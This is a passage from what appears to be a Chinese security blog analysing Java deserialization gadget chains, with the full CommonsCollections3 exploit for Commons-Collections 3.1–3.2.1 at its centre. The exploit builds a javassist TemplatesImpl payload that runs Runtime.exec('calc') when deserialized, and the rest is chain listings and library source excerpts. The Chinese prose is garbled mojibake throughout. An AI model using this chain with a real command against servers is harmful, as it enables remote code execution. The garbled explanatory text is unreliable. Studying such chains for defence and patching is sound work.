</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>ç”±æºç å¯çŸ¥ï¼Œ<code>tb.add(templatesImpl)</code>â€‹ä¼šè§¦å‘æˆ‘ä»¬çš„æ¶æ„æ’åºï¼Œå¦‚æœç”¨newTransformerä½œä¸ºå…¥å‚æ„é€ ï¼Œåˆ™æ­¤å¤„æŠ¥é”™ã€‚</p><p>å› æ­¤å…ˆä½¿ç”¨toStringä½œä¸ºå…¥å‚æ„é€ ï¼Œä½¿ä»£ç è¿è¡Œé€šè¿‡<code>tb.add(templatesImpl)</code>â€‹ï¼Œåé¢å†é€šè¿‡åå°„æŠŠtoStringæ”¹ä¸ºnewTransformerã€‚</p><h5 id=newtransformeræ„é€ æŠ¥é”™åŸå› >newTransformeræ„é€ æŠ¥é”™åŸå› </h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=c1>//TemplatesImplæºç </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>private</span><span class=w> </span><span class=n>Translet</span><span class=w> </span><span class=nf>getTransletInstance</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>throws</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>_name</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>_class</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=n>defineTransletClasses</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// The translet needs to keep a reference to all its auxiliary</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// class to prevent the GC from collecting them</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>AbstractTranslet</span><span class=w> </span><span class=n>translet</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>AbstractTranslet</span><span class=p>)</span><span class=w> </span><span class=n>_class</span><span class=o>[</span><span class=n>_transletIndex</span><span class=o>]</span><span class=p>.</span><span class=na>newInstance</span><span class=p>();</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>translet</span><span class=p>.</span><span class=na>postInitialization</span><span class=p>();</span><span class=c1>//2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>translet</span><span class=p>.</span><span class=na>setTemplates</span><span class=p>(</span><span class=k>this</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>translet</span><span class=p>.</span><span class=na>setOverrideDefaultParser</span><span class=p>(</span><span class=n>_overrideDefaultParser</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>translet</span><span class=p>.</span><span class=na>setAllowedProtocols</span><span class=p>(</span><span class=n>_accessExternalStylesheet</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>_auxClasses</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>translet</span><span class=p>.</span><span class=na>setAuxiliaryClasses</span><span class=p>(</span><span class=n>_auxClasses</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>translet</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>InstantiationException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ErrorMsg</span><span class=w> </span><span class=n>err</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ErrorMsg</span><span class=p>(</span><span class=n>ErrorMsg</span><span class=p>.</span><span class=na>TRANSLET_OBJECT_ERR</span><span class=p>,</span><span class=w> </span><span class=n>_name</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=p>(</span><span class=n>err</span><span class=p>.</span><span class=na>toString</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IllegalAccessException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ErrorMsg</span><span class=w> </span><span class=n>err</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ErrorMsg</span><span class=p>(</span><span class=n>ErrorMsg</span><span class=p>.</span><span class=na>TRANSLET_OBJECT_ERR</span><span class=p>,</span><span class=w> </span><span class=n>_name</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=p>(</span><span class=n>err</span><span class=p>.</span><span class=na>toString</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>ç¨‹åºåœ¨æ‰§è¡Œåˆ°æ³¨é‡Š1å¤„æ—¶ï¼Œè§¦å‘äº†æˆ‘ä»¬çš„æ¶æ„ä»£ç ã€‚</p><p>è€Œåœ¨æ³¨é‡Š2å¤„å‘ç”Ÿäº†ç©ºæŒ‡é’ˆæŠ¥é”™ï¼š</p><p>â€‹<img src=https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/image-20241009181730-h1lb8bd.png loading=lazy alt=image>â€‹</p><h2 id=commonscollections3>CommonsCollections3</h2><h3 id=ç‰ˆæœ¬é€‚ç”¨èŒƒå›´-2>ç‰ˆæœ¬é€‚ç”¨èŒƒå›´</h3><p>Commons-Collections 3.1-3.2.1</p><p>Java JDK &lt; 8u71</p><h3 id=expå±•ç¤º-3>Expå±•ç¤º</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javassist.CannotCompileException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javassist.ClassPool</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javassist.CtClass</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javassist.NotFoundException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.Transformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.ChainedTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.ConstantTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.InstantiateTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.map.LazyMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javax.xml.transform.Templates</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Map</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>CommonsCollections3</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>AbstractTranslet</span><span class=o>=</span><span class=s>&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>TemplatesImpl</span><span class=o>=</span><span class=s>&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClassPool</span><span class=w> </span><span class=n>classPool</span><span class=o>=</span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>classPool</span><span class=p>.</span><span class=na>appendClassPath</span><span class=p>(</span><span class=n>AbstractTranslet</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>payload</span><span class=o>=</span><span class=n>classPool</span><span class=p>.</span><span class=na>makeClass</span><span class=p>(</span><span class=s>&#34;CommonsCollections333333333&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>payload</span><span class=p>.</span><span class=na>setSuperclass</span><span class=p>(</span><span class=n>classPool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>AbstractTranslet</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>payload</span><span class=p>.</span><span class=na>makeClassInitializer</span><span class=p>().</span><span class=na>setBody</span><span class=p>(</span><span class=s>&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytes</span><span class=o>=</span><span class=n>payload</span><span class=p>.</span><span class=na>toBytecode</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>templatesImpl</span><span class=o>=</span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=n>TemplatesImpl</span><span class=p>).</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{}).</span><span class=na>newInstance</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>field</span><span class=o>=</span><span class=n>templatesImpl</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;_bytecodes&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>templatesImpl</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[][]</span><span class=p>{</span><span class=n>bytes</span><span class=p>});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>field1</span><span class=o>=</span><span class=n>templatesImpl</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;_name&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field1</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field1</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>templatesImpl</span><span class=p>,</span><span class=s>&#34;test&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Transformer</span><span class=o>[]</span><span class=w> </span><span class=n>transformers</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>Transformer</span><span class=o>[]</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>ConstantTransformer</span><span class=p>(</span><span class=n>TrAXFilter</span><span class=p>.</span><span class=na>class</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InstantiateTransformer</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>Templates</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=n>templatesImpl</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ChainedTransformer</span><span class=w> </span><span class=n>chainedTransformer</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>ChainedTransformer</span><span class=p>(</span><span class=n>transformers</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>map</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>lazyMap</span><span class=o>=</span><span class=w> </span><span class=n>LazyMap</span><span class=p>.</span><span class=na>decorate</span><span class=p>(</span><span class=n>map</span><span class=p>,</span><span class=n>chainedTransformer</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=w> </span><span class=n>cls</span><span class=o>=</span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=w> </span><span class=n>constructor</span><span class=o>=</span><span class=n>cls</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>Class</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=n>Map</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>constructor</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InvocationHandler</span><span class=w> </span><span class=n>invocationHandler</span><span class=o>=</span><span class=p>(</span><span class=n>InvocationHandler</span><span class=p>)</span><span class=n>constructor</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>Override</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=n>lazyMap</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>map1</span><span class=o>=</span><span class=p>(</span><span class=n>Map</span><span class=p>)</span><span class=w> </span><span class=n>Proxy</span><span class=p>.</span><span class=na>newProxyInstance</span><span class=p>(</span><span class=n>LazyMap</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getClassLoader</span><span class=p>(),</span><span class=n>LazyMap</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getInterfaces</span><span class=p>(),</span><span class=n>invocationHandler</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>object</span><span class=o>=</span><span class=n>constructor</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>Override</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=n>map1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>outputStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>FileOutputStream</span><span class=p>(</span><span class=s>&#34;test.out&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>outputStream</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>object</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>outputStream</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>inputStream</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>ObjectInputStream</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>FileInputStream</span><span class=p>(</span><span class=s>&#34;test.out&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>inputStream</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h3 id=expæ„é€ åˆ†æ-4>Expæ„é€ åˆ†æ</h3><p>CommonsCollections3æ˜¯CommonsCollections1å’ŒCommonsCollections2çš„ç»„åˆæ”¹é€ ç‰ˆã€‚</p><p>æ¶‰åŠçš„æ–°ç±»æœ‰InstantiateTransformerå’ŒTrAXFilterã€‚</p><h4 id=åˆ©ç”¨é“¾å±•ç¤º-2>åˆ©ç”¨é“¾å±•ç¤º</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>AnnotationInvocationHandler</span><span class=p>.</span><span class=na>readObject</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=n>Map</span><span class=p>(</span><span class=n>Proxy</span><span class=p>).</span><span class=na>entrySet</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>AnnotationInvocationHandler</span><span class=p>.</span><span class=na>invoke</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>LazyMap</span><span class=p>.</span><span class=na>get</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>ChainedTransformer</span><span class=p>.</span><span class=na>transform</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>ConstantTransformer</span><span class=p>.</span><span class=na>transform</span><span class=p>()</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>InstantiateTransformer</span><span class=p>.</span><span class=na>transform</span><span class=p>()</span><span class=c1>//2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                            </span><span class=n>TemplatesImpl</span><span class=p>.</span><span class=na>newTransformer</span><span class=p>()</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>å‰åŠéƒ¨åˆ†æ˜¯CommonsCollections1çš„LazyMapåˆ©ç”¨é“¾ï¼ŒååŠéƒ¨åˆ†æ˜¯CommonsCollections2çš„åˆ©ç”¨é“¾ã€‚</p><h4 id=traxfilter>TrAXFilter</h4><p>åœ¨åˆ©ç”¨é“¾æ³¨é‡Š1å¤„ä¼šå¾—åˆ°ä¸€ä¸ªTrAXFilterç±»ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>TrAXFilter</span><span class=p>(</span><span class=n>Templates</span><span class=w> </span><span class=n>templates</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>_templates</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>templates</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>_transformer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>TransformerImpl</span><span class=p>)</span><span class=n>templates</span><span class=p>.</span><span class=na>newTransformer</span><span class=p>();</span><span class=c1>//1 æ¼æ´åˆ©ç”¨ç‚¹</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>_transformerHandler</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerHandlerImpl</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>_transformer</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>_useServicesMechanism</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>_transformer</span><span class=p>.</span><span class=na>useServicesMechnism</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>æ ¹æ®ChainedTransformer.transform()çš„æºç å¾—çŸ¥ï¼Œè¿™ä¸ªç±»ä¼šä½œä¸ºInstantiateTransformer.transform()çš„å…¥å‚ã€‚</p><h4 id=instantiatetransformer>InstantiateTransformer</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>transform</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>input</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
